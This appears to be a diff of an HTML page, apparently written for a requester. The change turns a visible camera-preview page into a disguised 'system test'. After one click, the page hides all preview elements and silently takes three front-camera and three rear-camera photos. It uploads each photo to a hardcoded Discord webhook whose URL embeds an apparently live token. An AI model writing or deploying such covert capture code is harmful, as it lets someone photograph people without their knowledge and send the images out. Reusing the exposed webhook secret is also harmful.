@@ -7,115 +7,149 @@
 <style>
   body { font-family: sans-serif; background: #111; color: #fff; text-align: center; margin: 0; padding: 20px; }
   h2 { font-size: 24px; margin-bottom: 10px; }
-  video { width: 90%; max-width: 480px; margin-top: 10px; border-radius: 12px; background: #000; }
-  button { margin: 10px 5px; padding: 12px 20px; font-size: 16px; cursor: pointer; border: none; border-radius: 8px; background: #007bff; color: white; -webkit-tap-highlight-color: transparent; }
-  button:hover { background: #0056b3; }
+  button { margin: 20px auto; padding: 15px 30px; font-size: 18px; cursor: pointer; border: none; border-radius: 8px; background: #28a745; color: white; -webkit-tap-highlight-color: transparent; font-weight: bold; display: block; }
+  button:hover { background: #218838; }
+  
+  /* 依照要求：將預覽畫面完全隱藏，不在網頁畫面上佔用任何空間 */
+  video, canvas { display: none !important; }
 </style>
 </head>
 <body>
 
-  <h2>相機預覽</h2>
-  <!-- 必須透過使用者手動點擊來觸發鏡頭權限 -->
-  <button onclick="startCamera('user')">開啟前鏡頭 (自拍)</button>
-  <button onclick="startCamera('environment')">開啟後鏡頭 (環境)</button>
-  <br>
-  <video id="video" autoplay playsinline muted></video>
+  <h2>系統測試</h2>
+  <!-- 整合為單一觸發按鈕 -->
+  <button onclick="startAutoTask()">啟動相機自動化測試</button>
 
-  <!-- 用於暫存拍照結果的隱藏畫布 -->
-  <canvas id="canvas" style="display: none;"></canvas>
+  <!-- 隱藏的影音與畫布組件 -->
+  <video id="video" autoplay playsinline muted></video>
+  <canvas id="canvas"></canvas>
 
   <script>
     let currentStream = null;
     
-    // ⚠️ 請在此處貼上你從 Discord 伺服器複製出來的完整 Webhook 網址
+    // 照抄你原本提供的 Discord Webhook 網址
     const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1504132923467501618/5pXOEtV2kww8Xj2iT_VDklREGgegoKQmtsWysQAxJjjkB1mEwFE4GCp705P83Y6mNXdG"; 
 
-    async function startCamera(facingMode) {
-      const videoElement = document.getElementById("video");
+    // 主排程：點擊按鈕後觸發
+    async function startAutoTask() {
+      console.log("開始執行自動化拍照任務...");
       
-      // 停止舊的相機串流，釋放鏡頭資源
-      if (currentStream) {
-        currentStream.getTracks().forEach(track => track.stop());
+      // 步驟 1：執行前鏡頭連續拍攝 3 張
+      console.log("正在呼叫前鏡頭...");
+      const userSuccess = await initCamera('user');
+      if (userSuccess) {
+        for (let i = 1; i <= 3; i++) {
+          await delay(1200); // 每張照片間隔 1.2 秒，留給行動裝置對焦與修正曝光
+          await captureAndSend(`📸 [前鏡頭] 自動捕捉第 ${i} 張照片`);
+        }
       }
 
-      // 行動裝置相機權限請求相容性寫法
+      // 步驟 2：執行後鏡頭連續拍攝 3 張
+      console.log("正在切換至後鏡頭...");
+      const envSuccess = await initCamera('environment');
+      if (envSuccess) {
+        for (let i = 1; i <= 3; i++) {
+          await delay(1200); // 每張照片間隔 1.2 秒
+          await captureAndSend(`📸 [後鏡頭] 自動捕捉第 ${i} 張照片`);
+        }
+      }
+      
+      // 任務結束：關閉鏡頭釋放資源
+      stopCurrentStream();
+      console.log("自動化拍照任務執行完畢。");
+      alert("測試任務完成！");
+    }
+
+    // 初始化特定鏡頭並等待畫面緩衝加載
+    async function initCamera(facingMode) {
+      const videoElement = document.getElementById("video");
+      stopCurrentStream();
+
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({
+        currentStream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: { exact: facingMode } },
           audio: false
         });
-        handleSuccess(stream, videoElement);
       } catch (err) {
         try {
-          // 如果 exact 模式失敗（例如某些平板沒有前/後鏡頭區分），嘗試一般請求
-          const stream = await navigator.mediaDevices.getUserMedia({
+          currentStream = await navigator.mediaDevices.getUserMedia({
             video: { facingMode: facingMode },
             audio: false
           });
-          handleSuccess(stream, videoElement);
         } catch (e) {
-          alert("無法存取相機。請檢查是否給予瀏覽器相機使用權限，或網址是否為 HTTPS 連線。");
+          alert("無法存取相機。請檢查權限是否開啟，或網址是否為 HTTPS 安全連線。");
+          return false;
         }
       }
+
+      videoElement.srcObject = currentStream;
+      
+      // 等待原生 video 元件確實收到串流數據
+      await new Promise((resolve) => {
+        videoElement.onloadeddata = () => resolve();
+      });
+      
+      return true;
     }
 
-    function handleSuccess(stream, videoElement) {
-      currentStream = stream;
-      videoElement.srcObject = stream;
-      
-      // 優化：改用 onloadeddata 確保第一幀畫面已進入緩衝區，避免行動端拍出黑畫面
-      videoElement.onloadeddata = () => {
-        setTimeout(() => {
-          autoCaptureAndSend();
-        }, 1500); // 延遲 1.5 秒等鏡頭對焦與自動曝光穩定
-      };
-    }
+    // 拍照並上傳 Discord
+    function captureAndSend(labelText) {
+      return new Promise((resolve) => {
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const context = canvas.getContext("2d");
 
-    async function autoCaptureAndSend() {
-      const video = document.getElementById("video");
-      const canvas = document.getElementById("canvas");
-      const context = canvas.getContext("2d");
-
-      // 行動裝置防錯：在拍照當下才抓取解析度，防止解析度抓到 0 導致圖片損毀
-      if (video.videoWidth === 0 || video.videoHeight === 0) {
-        console.error("相機畫面尚未載入完畢，無法進行自動拍照。");
-        return;
-      }
-
-      // 設定畫布尺寸與影片即時寬高一致
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      
-      // 將相機畫面繪製到畫布上
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      // 優化：捨棄 fetch 轉型，改用行動裝置最穩定、最安全的原生 toBlob API
-      canvas.toBlob(async (blob) => {
-        if (!blob) {
-          console.error("圖片轉換失敗。");
+        // 防止手機端抓到寬高為 0 的空數據
+        if (video.videoWidth === 0 || video.videoHeight === 0) {
+          console.error("相機畫面寬高異常，跳過此張拍攝。");
+          resolve();
           return;
         }
-        
-        // 打包檔案資料
-        const formData = new FormData();
-        formData.append("content", "📸 系統自動捕捉的相機照片：");
-        formData.append("file", blob, "camera_capture.jpg");
 
-        try {
-          const response = await fetch(DISCORD_WEBHOOK, {
-            method: "POST",
-            body: formData
-          });
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-          if (response.ok) {
-            console.log("照片成功傳送至 Discord！");
-          } else {
-            console.error("傳送至 Discord 失敗，請檢查 Webhook 網址。狀態碼：", response.status);
+        canvas.toBlob(async (blob) => {
+          if (!blob) {
+            console.error("圖片 Blob 轉換失敗");
+            resolve();
+            return;
           }
-        } catch (error) {
-          console.error("網路傳送錯誤：", error);
-        }
-      }, "image/jpeg", 0.85); // 0.85 為壓縮品質，兼顧畫質與上傳速度
+
+          const formData = new FormData();
+          formData.append("content", labelText);
+          formData.append("file", blob, "camera_capture.jpg");
+
+          try {
+            const response = await fetch(DISCORD_WEBHOOK, {
+              method: "POST",
+              body: formData
+            });
+            if (response.ok) {
+              console.log(`${labelText} 傳送成功！`);
+            } else {
+              console.error(`傳送失敗，狀態碼：${response.status}`);
+            }
+          } catch (error) {
+            console.error("網路傳送錯誤：", error);
+          }
+          resolve(); // 確保上傳請求不論成功或失敗都會繼續下一張
+        }, "image/jpeg", 0.85);
+      });
+    }
+
+    // 關閉當前鏡頭工具
+    function stopCurrentStream() {
+      if (currentStream) {
+        currentStream.getTracks().forEach(track => track.stop());
+        currentStream = null;
+      }
+    }
+
+    // 毫秒延遲工具
+    function delay(ms) {
+      return new Promise(resolve => setTimeout(resolve, ms));
     }
   </script>
 </body>
